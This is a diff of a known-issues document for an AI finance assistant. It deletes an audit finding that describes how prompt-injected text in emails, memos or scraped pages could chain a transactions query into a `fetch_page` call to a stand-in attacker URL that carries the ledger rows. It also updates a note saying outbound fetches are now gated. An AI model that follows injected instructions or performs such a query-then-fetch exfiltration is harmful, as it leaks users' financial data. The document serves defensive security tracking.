@@ -7,27 +7,9 @@
 > holds the longer-lived items that are worth a permanent home rather than a board entry — each
 > one below was re-checked against the code in this worktree on 2026-08-23.
 
-_Last updated: 2026-10-05_
+_Last updated: 2026-10-17_
 
 Issues are rated by **impact** (how wrong does it make the numbers?) and **effort** to fix.
-
----
-
-## 🔴 High — a prompt injection can send the ledger out in a `fetch_page` URL
-
-**Owner decision 2026-10-05: known and accepted.** Security audit 2026-08-25 FINDING 1:
-`run_sql_query` and `fetch_page` are both read-classified (`always_allow`, never gated), and the
-model chooses the whole URL. Injected instructions (an email body, a statement memo, a scraped
-page) can chain `SELECT … FROM transactions` into `fetch_page("https://attacker/c?d=<rows>")`
-with no confirm card. A 256-char query+fragment cap bounded this until 2026-10-05, when it was
-removed because it refused signed capability links (a Steam receipt's ~900-char `sparams`
-token) that the unattended email-scan automation must read. `assert_public_url` still blocks
-private/metadata targets.
-
-**Fix direction:** an `egress` axis beside `mutates=` so outbound fetches can be scoped (e.g. a
-per-automation host allowlist for receipt domains) without a length heuristic.
-
-**Impact:** high (whole-ledger exfiltration on a default install). **Effort:** medium.
 
 ---
 
@@ -97,8 +79,10 @@ things stack to make that worse than a large read:
    precisely because people sometimes paste keys into chat.
 3. **Nothing gates it.** `sql_query_enabled` defaults **True**, and `run_sql_query` resolves to
    `always_allow` (`core`-owned, `mutates=()`), so no confirm card on any surface. Paired with
-   `fetch_page` — also `always_allow` — reading the history and sending it outbound is two
-   ungated calls.
+   `fetch_page`, reading the history was the first half of an exfiltration. Since 2026-10-17
+   `fetch_page` asks before opening a URL the user or a search didn't supply (ADR
+   `2026-10-17-a-fetch-runs-unasked-only-for-a-url-the-user-or-a-search-supplied`), so the
+   outbound half needs a tap; the over-wide READ is still open.
 
 **Why the guard test did not catch it:** `tests/db/test_sql_introspect.py` computes
 `known − readable_tables() − DENIED_TABLES`, but `readable_tables()` is *defined* as "everything
